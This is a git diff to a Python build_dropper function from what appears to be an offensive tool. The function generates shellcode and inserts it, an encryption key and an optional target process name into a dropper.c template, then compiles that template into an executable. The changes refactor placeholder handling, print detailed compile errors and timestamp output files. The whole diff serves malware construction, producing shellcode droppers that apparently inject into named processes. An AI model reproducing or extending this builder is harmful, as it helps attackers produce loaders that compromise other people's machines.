@@ -2,8 +2,8 @@ import os
 import subprocess
 import tempfile
 import shutil
-import time
 
+from datetime import datetime
 from .shellcode_generator import generate_shellcode
 
 
@@ -122,12 +122,14 @@ def build_dropper(**kwargs):
     #print(f"Encryption Key: {enc_key}")
     
     # Step 3: Replace placeholder in dropper.c
+    placehodlers = {"/* SHELLCODE */": format_shellcode(shellcode)}
+    if enc_key:
+        placehodlers["/* KEY */"] = f"unsigned char key [] = {{\n\t{enc_key}\n}};"
+    if kwargs.get("process_name"):
+        placehodlers["/* PROCESS_NAME */"] = f"L\"{kwargs.get('process_name')}\""
+    
     dropper_source_path = os.path.join(temp_dir, "dropper.c")
-    print(f"unsigned char key [] = {{\n\t{enc_key}\n}};")
-    replace_placeholders(dropper_source_path, {
-        "/* SHELLCODE */": format_shellcode(shellcode), 
-        "/* KEY */": f"unsigned char key [] = {{\n\t{enc_key}\n}};" 
-    })    
+    replace_placeholders(dropper_source_path, placehodlers)    
     
     # Step 4: Prepare shellcode argument
     shellcode_arg = shellcode_path if shellcode_path else kwargs.get('shellcode_text', '')
@@ -148,11 +150,14 @@ def build_dropper(**kwargs):
     
     # Step 7: Run the make command with error handling
     try:
-        #subprocess.run(command, check=True, cwd=temp_dir, stdout=subprocess.DEVNULL)
-        subprocess.run(command, check=True, cwd=temp_dir)
+        subprocess.run(command, check=True, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         print("✅ Compilation done successfully.")
     except subprocess.CalledProcessError as e:
         print(f"❌ Compilation failed: {e}")
+        print(f"#### Error Details ####")
+        print(f"### Command:\n{command}\n")
+        print(f"### stdout:\n{e.stdout}\n")
+        print(f"### stderr:\n{e.stderr}\n")
         
     # Step 8: Move the output file to the specified output directory
     src = os.path.join(temp_dir, "bin", out_filename)
@@ -161,7 +166,7 @@ def build_dropper(**kwargs):
     
     if os.path.exists(dst):
         base, ext = os.path.splitext(out_filename)
-        new_filename = f"{base}_{int(time.time())}{ext}"
+        new_filename = f"{base}_{datetime.now().strftime("%d_%m_%Y-%H_%M_%S")}{ext}"
         dst = os.path.join(dst_dir, new_filename)
     
     try:
